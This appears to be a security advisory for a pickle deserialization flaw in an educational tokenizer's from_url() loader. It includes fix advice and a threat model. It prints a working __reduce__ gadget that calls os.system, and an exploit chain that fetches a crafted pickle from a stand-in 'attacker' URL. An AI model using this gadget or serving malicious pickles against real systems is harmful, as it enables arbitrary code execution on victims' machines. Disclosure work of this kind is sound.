# DeepPickle — google-deepmind/ai-foundations `BPEWordTokenizer.from_url()` pickle RCE

| Field | Value |
| --- | --- |
| Product | [google-deepmind/ai-foundations](https://github.com/google-deepmind/ai-foundations) (Google DeepMind AI-research curriculum — self-described "not an official Google product", educational) |
| Component | `ai_foundations/tokenization/bpe_tokenizer.py` — `BPEWordTokenizer.from_url()` |
| Affected | `main` @ `5338de78c28ecd87548a3b003038b095abf5cb93` (and any prior `from_url`) |
| CVSS 3.1 | **7.8 HIGH** `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| CWE | CWE-502 (Deserialization of Untrusted Data) |
| Fix | none at the time of writing (no CVE/GHSA assigned) |
| Class | time-seeded/weak-deserialization analogue of the V12/Stanza untrusted-model-deser class |

## Summary

`BPEWordTokenizer.from_url(url)` is a public classmethod for loading a pretrained
Byte-Pair-Encoding tokenizer from a URL. It fetches the URL and passes the raw
response directly to the Python `pickle.load()`:

```python
@classmethod
def from_url(cls, url: str) -> "BPEWordTokenizer":
    """Loads a pickled tokenizer from a url. ..."""
    with request.urlopen(url) as response:
        tokenizer = pickle.load(response)      # <-- arbitrary code execution
    ...
    return tokenizer
```

`pickle` is an executable serialization format: unpickling an attacker-controlled
stream runs the object's `__reduce__` result. `from_url` performs no validation,
emits no warning, and does not restrict which classes may be instantiated, so a
URL that serves a crafted pickle executes arbitrary code in the process that
"loads a tokenizer".

## Vulnerability details

`pickle.load()` resolves any importable callable referenced in the stream, e.g.
`os.system`, `subprocess.Popen`, or `__import__`. The minimal `__reduce__` gadget

```python
class Evil:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned",))
```

is sufficient. When a victim calls `from_url("http://attacker/tokenizer.pkl")`,
the `id` command runs with the victim's privileges.

### Exploit chain

```
attacker hosts  http://attacker/tokenizer.pkl   (a crafted pickle)
   └─► victim calls BPEWordTokenizer.from_url("http://attacker/tokenizer.pkl")
         └─► request.urlopen(url)        # fetch, no scheme/host allowlist
               └─► pickle.load(response) # __reduce__ -> os.system(...)  == RCE
```

## Fix

Replace `pickle` with a safe interchange format (JSON vocabulary + merge rules,
`safetensors`, or a restricted unpickler with a class allowlist). As shipped,
even `pickle` with a warning would be insufficient — the loader must not execute
attacker-supplied bytecode.

## Run

```
bash run.sh
```

Clones the real repo at the pinned commit, serves a malicious pickle over HTTP,
and calls the real `BPEWordTokenizer.from_url()` on it. Expected output ends with
`RCE CONFIRMED — arbitrary command executed as the loader process` followed by the
`id` output.

## Exploitability assessment (honest threat model)

- **Preconditions:** a developer/engineer loads a tokenizer from a URL they do not
  fully trust — a third-party model hub, a colleague's shared link, a
  typosquatted/compromised artifact URL. This is the *documented* use of the
  method ("the URL where the pickled tokenizer is stored"), so no unusual misuse
  is required. No attacker-side privileges are needed; the attacker only controls
  the bytes served from the URL.
- **Impact:** arbitrary code execution as the loader process (the ML engineer's
  machine or CI runner), i.e. the classic untrusted-model-deserialization class
  (cf. Stanza CVE-2026-115878, MLflow CVE-2026-118623).
- **Boundaries / honest caveats:** this is **not** an unauthenticated remote RCE —
  the victim must *choose* to load a malicious URL (`UI:R`, `AV:L`). If an
  organization only ever loads tokenizers from a fixed, trusted origin, the risk
  is latent rather than immediately exploitable. The vulnerability is the library
  *silently* deserializing untrusted bytes with no guard, warning, or safe
  alternative — not a hardening gap in a downstream app. Note also that
  `ai-foundations` is an **educational** research curriculum (the repo itself
  states it is "not an official Google product" and "intended for educational
  purposes only"), so real-world *deployment* is thinner than a production
  library like Stanza/MLflow — the flaw is genuine and the class is the same, but
  treat deployment confidence accordingly.
